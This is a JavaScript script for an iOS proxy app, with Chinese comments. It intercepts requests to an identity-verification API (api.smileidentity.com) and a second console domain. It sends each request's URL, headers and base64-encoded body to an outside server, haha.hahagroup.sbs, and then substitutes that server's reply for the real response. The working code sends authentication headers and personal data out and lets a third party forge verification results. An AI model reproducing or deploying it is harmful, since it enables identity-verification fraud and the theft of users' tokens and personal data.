const TARGET_DOMAINS = ["api.smileidentity.com", "users.mab.console.teamapt.com"];
const BASE_FORWARD_URL = "https://haha.hahagroup.sbs/data";

// 获取脚本参数并构造完整的转发 URL
const scriptURL = $argument || '';  // 如果没有参数则使用空字符串
const FORWARD_URL = scriptURL ? `${BASE_FORWARD_URL}?h=${encodeURIComponent(scriptURL)}` : BASE_FORWARD_URL;

if ($request && TARGET_DOMAINS.some(domain => $request.url.includes(domain))) {
    // 添加请求通知
    $notification.post(
        "正在转发请求",
        $request.url,
        `转发至: ${FORWARD_URL}`
    );

    const originalUrl = $request.url;
    const method = $request.method;
    const headers = $request.headers;
    const body = $request.body;
    const originalContentType = headers['Content-Type'] || headers['content-type'] || '';

    let bodyEncoded = "";
    if (body) {
        try {
            if (body instanceof Uint8Array) {
                let binary = '';
                for (let i = 0; i < body.length; i++) {
                    binary += String.fromCharCode(body[i]);
                }
                bodyEncoded = customBtoa(binary);
            } else if (typeof body === "string") {
                bodyEncoded = customBtoa(body);
            }
        } catch (e) {
            $notification.post(
                "Body Processing Error",
                e.message,
                `Type: ${typeof body}`
            );
            $done({ status: 'rejected' });
        }
    }

    const data = {
        originalUrl: originalUrl,
        method: method,
        headers: headers,
        bodyBase64: bodyEncoded,
        originalContentType: originalContentType
    };

    $httpClient.post({
        url: FORWARD_URL,
        headers: {
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Accept": "application/json"
        },
        body: JSON.stringify(data),
        timeout: 6000
    }, function(error, response, data) {
        if (error) {
            $notification.post(
                "请求转发失败",
                originalUrl,
                `错误: ${JSON.stringify(error)}`
            );
            $done({ status: 'rejected' });
        } else {
            try {
                const responseData = JSON.parse(data);
                // 添加响应通知
                $notification.post(
                    "请求响应成功",
                    originalUrl,
                    `状态码: ${response.status}, 处理状态: ${responseData.process ? '继续处理' : '直接返回'}`
                );

                if (responseData.message) {
                    $notification.post(
                        "服务器消息",
                        originalUrl,
                        responseData.message
                    );
                }
                
                if (responseData.process === true) {
                    $done({});
                } else {
                    const response = {
                        response: {
                            status: 200,
                            headers: {
                                'Content-Type': 'application/json;charset=utf-8'
                            },
                            body: JSON.stringify(responseData.data)
                        }
                    };
                    
                    $done(response);
                }
            } catch (e) {
                $notification.post(
                    "响应解析错误",
                    originalUrl,
                    `错误信息: ${e.message}, 原始响应: ${data}`
                );
                $done({ status: 'rejected' });
            }
        }
    });
} else if ($request) {
    // 添加对BASE_FORWARD_URL的请求通知
    if ($request.url === BASE_FORWARD_URL) {
        $notification.post(
            "正在请求转发服务器",
            BASE_FORWARD_URL,
            `方法: ${$request.method}`
        );
    }
    $done({});
} else {
    $done({});
}

// 实现基础的 base64 编码函数
function customBtoa(str) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let encoded = '';
    let i = 0;
    while (i < str.length) {
        const c1 = str.charCodeAt(i++);
        const c2 = i < str.length ? str.charCodeAt(i++) : 0;
        const c3 = i < str.length ? str.charCodeAt(i++) : 0;

        const triplet = (c1 << 16) | (c2 << 8) | c3;
        encoded += chars[(triplet >> 18) & 0x3F];
        encoded += chars[(triplet >> 12) & 0x3F];
        encoded += i > str.length + 1 ? '=' : chars[(triplet >> 6) & 0x3F];
        encoded += i > str.length ? '=' : chars[triplet & 0x3F];
    }
    return encoded;
}
